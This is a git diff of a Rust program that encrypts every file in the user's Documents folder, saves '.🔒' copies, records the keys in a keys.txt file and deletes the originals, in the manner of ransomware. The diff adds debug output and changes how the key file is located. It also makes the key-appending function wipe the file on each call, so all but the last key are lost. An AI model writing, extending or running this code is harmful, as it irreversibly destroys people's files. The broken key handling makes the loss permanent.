@@ -3,6 +3,7 @@ use std::{fs, path::Path};
 use std::path::PathBuf;
 use anyhow::{Result, Ok};
 use orion::aead;
+use dirs::document_dir;
 
 const ENCRYPTED_EXTENSION:	&str	= ".🔒";
 const KEY_FILE_NAME:		&str	= "keys.txt";
@@ -15,24 +16,26 @@ type CipherAndKey = (Vec<u8>, aead::SecretKey);
 
 
 fn main() -> Result<()> {
-	let target_dir = format!(
-		"{}\\Documents",
-		dirs::home_dir().unwrap_or("~".into()).to_string_lossy(),
-	);
+	let target_dir = document_dir().unwrap();
+	let mut keyfile_loc = target_dir.clone();
+	keyfile_loc.push(KEY_FILE_NAME);
+	let keyfile_loc = keyfile_loc; // make immutable
+
+	dbg!(&target_dir);
 
 	let entries = fs::read_dir(target_dir)?;
 	for entry in entries {
 		let path = entry?.path();
 
 		if path.is_file() {
-			encrypt_file(path)?;
+			encrypt_file(path, keyfile_loc.as_path())?;
 		}
 	}
 
 	Ok(())
 }
 
-fn encrypt_file(path: PathBuf) -> Result<()> {
+fn encrypt_file(path: PathBuf, keyfile_loc: &Path) -> Result<()> {
 	let file_name = path.file_name().unwrap().to_string_lossy();
 
 	if !file_name.ends_with(ENCRYPTED_EXTENSION) {
@@ -40,14 +43,31 @@ fn encrypt_file(path: PathBuf) -> Result<()> {
 			format!("{}{}", path.display(), ENCRYPTED_EXTENSION)
 		);
 
+		dbg!(&file_name);
+		dbg!(&encrypted_path);
+		dbg!(&path);
+
 		// Prepare new file data
 		let content = fs::read(&path)?;
 		let (ciphertext, key) = encrypt_xchacha20(&content[..])?;
 
+		println!("among us");
+
 		// Write encrypted data to new file
 		fs::write(&encrypted_path, &ciphertext[..])?;
-		append_file(KEY_FILE_NAME, key.unprotected_as_bytes())?;
+
+		println!("Write successful");
+
+		append_file(keyfile_loc, key.unprotected_as_bytes())?;
+		
+		println!("Key append successful");
+
 		fs::remove_file(&path)?;
+
+		dbg!(&file_name);
+		dbg!(&encrypted_path);
+		dbg!(&path);
+		println!("k.");
 	}
 
 	Ok(())
@@ -66,9 +86,12 @@ fn encrypt_xchacha20(src: &[u8]) -> Result<CipherAndKey> {
 }
 
 fn append_file<F: AsRef<Path>>(path: F, data: &[u8]) -> Result<()> {
+	fs::write(&path, &[])?;
+
 	let mut file = fs::OpenOptions::new()
 		.append(true)
-		.open(path)?;
+		.create(true)
+		.open(&path)?;
 
 	file.write(data)?;
 
